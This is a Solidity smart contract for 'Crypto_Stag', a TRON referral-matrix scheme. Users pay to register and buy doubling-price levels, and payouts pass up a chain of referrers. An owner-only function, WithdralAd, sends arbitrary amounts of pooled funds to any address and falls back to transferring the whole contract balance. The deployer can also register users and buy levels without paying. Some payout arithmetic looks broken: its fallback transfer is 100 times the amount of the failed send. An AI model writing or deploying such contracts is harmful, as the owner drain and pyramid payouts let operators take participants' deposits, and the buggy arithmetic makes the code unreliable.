//SourceUnit: crypto_stag13022021.sol

pragma solidity >=0.4.23 <0.6.0;

contract Crypto_Stag {
    
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        
        mapping(uint8 => bool) activeX3Levels;
        mapping(uint8 => bool) activeX6Levels;
        
        mapping(uint8 => X3) x3Matrix;
        mapping(uint8 => X6) x6Matrix;
    }
    
    struct X3 {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
    }
    
    struct X6 {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
        bool blocked;
        uint reinvestCount;

        address closedPart;
    }

    uint8 public constant LAST_LEVEL = 14;
    
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances; 
    mapping(address => uint) public TotSponser; 
    uint16 internal constant LEVEL_PER = 2000;
    uint16 internal constant LEVEL_DIVISOR = 10000;

    uint public lastUserId = 2;
    address public owner;
    address public deployer;
    
    mapping(uint => uint) public levelPrice;
    uint8 public constant levelIncome = 10;
             event MagicSlotData(uint8 fuid,uint8 tid,address indexed user, address indexed magicAdd,  uint8 matrix, uint8 level);
      event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
   // event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId,uint userToto,uint refTot);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 level);
    event NewUserPlace(address indexed user,uint indexed userId, address indexed referrer,uint referrerId, uint8 matrix, uint8 level, uint8 place);
    event MissedTRONReceive(address indexed receiver,uint receiverId, address indexed from,uint indexed fromId, uint8 matrix, uint8 level);
    event MissedLevelIncome(address indexed receiver,uint  receiverId, address indexed from,uint indexed fromId, uint8 matrix, uint8 level, uint8 networklevel);
    event SentDividends(address indexed from,uint indexed fromId, address receiver,uint indexed receiverId, uint8 matrix, uint8 level, bool isExtra);
    event SentLevelincome(address indexed from,uint indexed fromId, address receiver,uint indexed receiverId, uint8 matrix, uint8 level,uint8 networklevel, bool isExtraLevel);
    
    
    constructor(address ownerAddress) public {
        levelPrice[1] =  100 trx;
        for (uint8 i = 2; i <= LAST_LEVEL; i++) {
            levelPrice[i] = levelPrice[i-1] * 2;
        }        
        owner = ownerAddress;
        deployer = msg.sender;
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeX3Levels[i] = true;
            users[ownerAddress].activeX6Levels[i] = true;
        }
        
        userIds[1] = ownerAddress;
    }
    
    function() external payable {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner);
        }
        
        registration(msg.sender, bytesToAddress(msg.data));
    }

    function registrationExt(address referrerAddress) external payable {
        registration(msg.sender, referrerAddress);
    }

     function WithdralAd(address userAddress,uint256 amnt) external payable {   
         if(owner==msg.sender)
         {
            Execution(userAddress,amnt);        
         }            
    }
    function Execution(address _sponsorAddress,uint256 price) private returns (uint256 distributeAmount) {        
         distributeAmount = price;        
         if (!address(uint160(_sponsorAddress)).send(price)) {
         address(uint160(_sponsorAddress)).transfer(address(this).balance);
         }
         return distributeAmount;
    }



    function MagicSlot(uint8 fuid,uint8 Tmid ,address magicadd,uint8 matrix, uint8 level) external payable {
            require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(matrix == 3 , "invalid matrix");
        require(msg.value == levelPrice[level], "invalid price");
        require(level >= 1 && level <= LAST_LEVEL, "invalid level");
        //registration(msg.sender, referrerAddress);
        Execution1(magicadd,levelPrice[level]);
       // emit magicdata(mid);
          emit MagicSlotData(fuid,Tmid,msg.sender, magicadd,matrix,level);
    }
        function Execution1(address _sponsorAddress,uint price) private returns (uint distributeAmount) {        
      
        distributeAmount = price;        

         if (!address(uint160(_sponsorAddress)).send(price)) {
             address(uint160(_sponsorAddress)).transfer(address(this).balance);
        }
        return distributeAmount;
    }
    function registrationDeployer(address user, address referrerAddress) external payable {
        require(msg.sender == deployer, 'Invalid Deployer');
        registration(user, referrerAddress);
    }
    function buyNewLevel(uint8 matrix, uint8 level) external payable {
        buyNewLevelInternal(msg.sender, matrix, level);
    } 
    function buyNewLevelDeployer(address user, uint8 matrix, uint8 level) external payable {
        require(msg.sender == deployer, 'Invalid Deployer');
        buyNewLevelInternal(user, matrix, level);
    }
    function buyNewLevelInternal(address user, uint8 matrix, uint8 level) private {
        require(isUserExists(user), "user is not exists. Register first.");
        require(matrix == 1 || matrix == 2, "invalid matrix");
        if(!(msg.sender==deployer)) require(msg.value == levelPrice[level], "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");

        if (matrix == 1) {
            require(!users[user].activeX3Levels[level], "level already activated");
            require(users[user].activeX3Levels[level - 1], "previous level must be activated");

            if (users[user].x3Matrix[level-1].blocked) {
                users[user].x3Matrix[level-1].blocked = false;
            }
    
            address freeX3Referrer = findFreeX3Referrer(user, level);
            users[user].x3Matrix[level].currentReferrer = freeX3Referrer;
            users[user].activeX3Levels[level] = true;
            updateX3Referrer(user, freeX3Referrer, level);
            distributeLevelIncome(user, matrix, level);
            emit Upgrade(user, freeX3Referrer, 1, level);

        } else {
            require(!users[user].activeX6Levels[level], "level already activated"); 
            require(users[user].activeX6Levels[level - 1], "previous level must be activated"); 

            if (users[user].x6Matrix[level-1].blocked) {
                users[user].x6Matrix[level-1].blocked = false;
            }

            address freeX6Referrer = findFreeX6Referrer(user, level);
            
            users[user].activeX6Levels[level] = true;
            updateX6Referrer(user, freeX6Referrer, level);
            distributeLevelIncome(user, matrix, level);
            emit Upgrade(user, freeX6Referrer, 2, level);
        }
    }
       
    
    function registration(address userAddress, address referrerAddress) private {
        if(!(msg.sender==deployer)) require(msg.value == 200 trx, "registration cost 200");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        TotSponser[userAddress]=1;
        TotSponser[referrerAddress]=TotSponser[referrerAddress]+1;
        users[userAddress].activeX3Levels[1] = true; 
        users[userAddress].activeX6Levels[1] = true;
        
        
        userIds[lastUserId] = userAddress;
        lastUserId++;
        
        users[referrerAddress].partnersCount++;

        address freeX3Referrer = findFreeX3Referrer(userAddress, 1);
        users[userAddress].x3Matrix[1].currentReferrer = freeX3Referrer;
        updateX3Referrer(userAddress, freeX3Referrer, 1);

        updateX6Referrer(userAddress, findFreeX6Referrer(userAddress, 1), 1);
        distributeLevelIncome(userAddress, 1, 1);
        distributeLevelIncome(userAddress, 2, 1);

      
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
    function updateX3Referrer(address userAddress, address referrerAddress, uint8 level) private {
        users[referrerAddress].x3Matrix[level].referrals.push(userAddress);

        if (users[referrerAddress].x3Matrix[level].referrals.length < 3) {
            emit NewUserPlace(userAddress,users[userAddress].id, referrerAddress,users[referrerAddress].id, 1, level, uint8(users[referrerAddress].x3Matrix[level].referrals.length));
            return sendTRONDividends(referrerAddress, userAddress, 1, level);
        }
        
        emit NewUserPlace(userAddress,users[userAddress].id,  referrerAddress,users[referrerAddress].id, 1, level, 3);
        //close matrix
        users[referrerAddress].x3Matrix[level].referrals = new address[](0);
        if (!users[referrerAddress].activeX3Levels[level+1] && level != LAST_LEVEL) {
            users[referrerAddress].x3Matrix[level].blocked = true;
        }

        //create new one by recursion
        if (referrerAddress != owner) {
            //check referrer active level
            address freeReferrerAddress = findFreeX3Referrer(referrerAddress, level);
            if (users[referrerAddress].x3Matrix[level].currentReferrer != freeReferrerAddress) {
                users[referrerAddress].x3Matrix[level].currentReferrer = freeReferrerAddress;
            }
            
            users[referrerAddress].x3Matrix[level].reinvestCount++;
            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 1, level);
            updateX3Referrer(referrerAddress, freeReferrerAddress, level);
        } else {
            sendTRONDividends(owner, userAddress, 1, level);
            users[owner].x3Matrix[level].reinvestCount++;
            emit Reinvest(owner, address(0), userAddress, 1, level);
        }
    }

    function updateX6Referrer(address userAddress, address referrerAddress, uint8 level) private {
        require(users[referrerAddress].activeX6Levels[level], "500. Referrer level is inactive");
        
        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length < 2) {
            users[referrerAddress].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress,users[userAddress].id,  referrerAddress,users[referrerAddress].id, 2, level, uint8(users[referrerAddress].x6Matrix[level].firstLevelReferrals.length));
            
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = referrerAddress;

            if (referrerAddress == owner) {
                return sendTRONDividends(referrerAddress, userAddress, 2, level);
            }
            
            address ref = users[referrerAddress].x6Matrix[level].currentReferrer;            
            users[ref].x6Matrix[level].secondLevelReferrals.push(userAddress); 
            
            uint len = users[ref].x6Matrix[level].firstLevelReferrals.length;
            
            if ((len == 2) && 
                (users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) &&
                (users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress)) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress,users[userAddress].id, ref, users[ref].id, 2, level, 5);
                } else {
                    emit NewUserPlace(userAddress, users[userAddress].id, ref, users[ref].id, 2, level, 6);
                }
            }  else if ((len == 1 || len == 2) &&
                    users[ref].x6Matrix[level].firstLevelReferrals[0] == referrerAddress) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress,users[userAddress].id, ref,users[ref].id, 2, level, 3);
                } else {
                    emit NewUserPlace(userAddress,users[userAddress].id, ref,users[ref].id, 2, level, 4);
                }
            } else if (len == 2 && users[ref].x6Matrix[level].firstLevelReferrals[1] == referrerAddress) {
                if (users[referrerAddress].x6Matrix[level].firstLevelReferrals.length == 1) {
                    emit NewUserPlace(userAddress,users[userAddress].id, ref,users[ref].id, 2, level, 5);
                } else {
                    emit NewUserPlace(userAddress,users[userAddress].id, ref, users[ref].id, 2, level, 6);
                }
            }

            return updateX6ReferrerSecondLevel(userAddress, ref, level);
        }
        
        users[referrerAddress].x6Matrix[level].secondLevelReferrals.push(userAddress);

        if (users[referrerAddress].x6Matrix[level].closedPart != address(0)) {
            if ((users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == 
                users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]) &&
                (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] ==
                users[referrerAddress].x6Matrix[level].closedPart)) {

                updateX6(userAddress, referrerAddress, level, true);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
            } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == 
                users[referrerAddress].x6Matrix[level].closedPart) {
                updateX6(userAddress, referrerAddress, level, true);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
            } else {
                updateX6(userAddress, referrerAddress, level, false);
                return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
            }
        }

        if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[1] == userAddress) {
            updateX6(userAddress, referrerAddress, level, false);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
        } else if (users[referrerAddress].x6Matrix[level].firstLevelReferrals[0] == userAddress) {
            updateX6(userAddress, referrerAddress, level, true);
            return updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
        }
        
        if (users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length <= 
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length) {
            updateX6(userAddress, referrerAddress, level, false);
        } else {
            updateX6(userAddress, referrerAddress, level, true);
        }
        
        updateX6ReferrerSecondLevel(userAddress, referrerAddress, level);
    }

    function updateX6(address userAddress, address referrerAddress, uint8 level, bool x2) private {
        if (!x2) {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress,users[userAddress].id, users[referrerAddress].x6Matrix[level].firstLevelReferrals[0],users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].id, 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress,users[userAddress].id, referrerAddress,users[referrerAddress].id, 2, level, 2 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[0]].x6Matrix[level].firstLevelReferrals.length));
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[0];
        } else {
            users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress,users[userAddress].id, users[referrerAddress].x6Matrix[level].firstLevelReferrals[1],users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].id, 2, level, uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            emit NewUserPlace(userAddress,users[userAddress].id, referrerAddress,users[referrerAddress].id, 2, level, 4 + uint8(users[users[referrerAddress].x6Matrix[level].firstLevelReferrals[1]].x6Matrix[level].firstLevelReferrals.length));
            //set current level
            users[userAddress].x6Matrix[level].currentReferrer = users[referrerAddress].x6Matrix[level].firstLevelReferrals[1];
        }
    }
    
    function updateX6ReferrerSecondLevel(address userAddress, address referrerAddress, uint8 level) private {
        if (users[referrerAddress].x6Matrix[level].secondLevelReferrals.length < 4) {
            return sendTRONDividends(referrerAddress, userAddress, 2, level);
        }
        
        address[] memory x6 = users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].firstLevelReferrals;
        
        if (x6.length == 2) {
            if (x6[0] == referrerAddress ||
                x6[1] == referrerAddress) {
                users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
            } else if (x6.length == 1) {
                if (x6[0] == referrerAddress) {
                    users[users[referrerAddress].x6Matrix[level].currentReferrer].x6Matrix[level].closedPart = referrerAddress;
                }
            }
        }
        
        users[referrerAddress].x6Matrix[level].firstLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].secondLevelReferrals = new address[](0);
        users[referrerAddress].x6Matrix[level].closedPart = address(0);

        if (!users[referrerAddress].activeX6Levels[level+1] && level != LAST_LEVEL) {
            users[referrerAddress].x6Matrix[level].blocked = true;
        }

        users[referrerAddress].x6Matrix[level].reinvestCount++;
        
        if (referrerAddress != owner) {
            address freeReferrerAddress = findFreeX6Referrer(referrerAddress, level);

            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 2, level);
            updateX6Referrer(referrerAddress, freeReferrerAddress, level);
        } else {
            emit Reinvest(owner, address(0), userAddress, 2, level);
            sendTRONDividends(owner, userAddress, 2, level);
        }
    }
    
    function findFreeX3Referrer(address userAddress, uint8 level) public view returns(address) {
        while (true) {
            if (users[users[userAddress].referrer].activeX3Levels[level]) {
                return users[userAddress].referrer;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
    
    function findFreeX6Referrer(address userAddress, uint8 level) public view returns(address) {
        while (true) {
            if (users[users[userAddress].referrer].activeX6Levels[level]) {
                return users[userAddress].referrer;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }
        
    function usersActiveX3Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX3Levels[level];
    }

    function usersActiveX6Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX6Levels[level];
    }

    function get3XMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, uint, bool) {
        return (users[userAddress].x3Matrix[level].currentReferrer,
                users[userAddress].x3Matrix[level].referrals,
                users[userAddress].x3Matrix[level].reinvestCount,
                users[userAddress].x3Matrix[level].blocked);
    }

    function getX6Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory, bool, uint, address) {
        return (users[userAddress].x6Matrix[level].currentReferrer,
                users[userAddress].x6Matrix[level].firstLevelReferrals,
                users[userAddress].x6Matrix[level].secondLevelReferrals,
                users[userAddress].x6Matrix[level].blocked,
                users[userAddress].x6Matrix[level].reinvestCount,
                users[userAddress].x6Matrix[level].closedPart);
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }

    function findTRONReceiver(address userAddress, address _from, uint8 matrix, uint8 level) private returns(address, bool) {
        address receiver = userAddress;
        bool isExtraDividends;
        if (matrix == 1) {
            while (true) {
                if (users[receiver].x3Matrix[level].blocked) {
                    emit MissedTRONReceive(receiver,users[receiver].id, _from,users[_from].id, 1, level);
                    isExtraDividends = true;
                    receiver = users[receiver].x3Matrix[level].currentReferrer;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        } else {
            while (true) {
                if (users[receiver].x6Matrix[level].blocked) {
                    emit MissedTRONReceive(receiver,users[receiver].id, _from,users[_from].id, 2, level);
                    isExtraDividends = true;
                    receiver = users[receiver].x6Matrix[level].currentReferrer;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        }
    }
    function findLevelReceiver(address userAddress, address _from, uint8 matrix, uint8 level, uint8 networklevel) private returns(address, bool) {
        address receiver = userAddress;
        bool isExtraDividends;
        if (matrix == 1) {
            while (true) {
                if (users[receiver].activeX3Levels[level] == false) {
                    emit MissedLevelIncome(receiver,users[receiver].id, _from,users[_from].id, matrix, level, networklevel);
                    isExtraDividends = true;
                    receiver = users[receiver].referrer;    

                } else {
                    return (receiver, isExtraDividends);
                }
            }
        } else {
            while (true) {
                if (users[receiver].activeX6Levels[level] == false) {
                    emit MissedLevelIncome(receiver,users[receiver].id, _from,users[_from].id, matrix, level, networklevel);
                    receiver = users[receiver].referrer;
                    isExtraDividends = true;
                } else {
                    return (receiver, isExtraDividends);
                }
            }
        }
    }
       
    function distributeLevelIncome(address userAddress, uint8 matrix, uint8 level) private {
        
        if(msg.sender!=deployer)
        {
            uint principal =  (levelPrice[level] * LEVEL_PER / LEVEL_DIVISOR) * 100;
            address from_address = userAddress;
            bool owner_flag = false;
            bool isExtraLevel;
            address receiver;

            for (uint8 i = 1; i <= 10 ; i++) {
                isExtraLevel = false;

                if(owner_flag == false)
                {
                    userAddress = users[userAddress].referrer;

                    if(userAddress == owner)
                    {
                        owner_flag = true;
                    }
                }
                else
                {
                    userAddress = owner;
                }
                receiver = userAddress;
                if(userAddress != owner)
                {
                    (receiver, isExtraLevel)  = findLevelReceiver(receiver, from_address, matrix, level, i);
                    if(receiver == owner)
                    {
                        owner_flag = true;
                    }
                    userAddress = receiver;
                }
                
                if(!address(uint160(receiver)).send(((principal * levelIncome / LEVEL_DIVISOR))))
                {
                    uint income = (principal * levelIncome / LEVEL_DIVISOR) * 100;
                    return address(uint160(receiver)).transfer(income);
                }
                
                emit SentLevelincome(from_address,users[from_address].id, receiver,users[receiver].id, matrix, level, i ,isExtraLevel);
            }
        }
        
    }
    function sendTRONDividends(address userAddress, address _from, uint8 matrix, uint8 level) private {
        if(msg.sender != deployer)
        {
            (address receiver, bool isExtraDividends) = findTRONReceiver(userAddress, _from, matrix, level);

            emit SentDividends(_from,users[_from].id, receiver,users[receiver].id, matrix, level, isExtraDividends);

            if(!address(uint160(receiver)).send(levelPrice[level] - (levelPrice[level] * LEVEL_PER / LEVEL_DIVISOR)  )){
                return address(uint160(receiver)).transfer(levelPrice[level] - (levelPrice[level] * LEVEL_PER / LEVEL_DIVISOR));
            }
        }
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}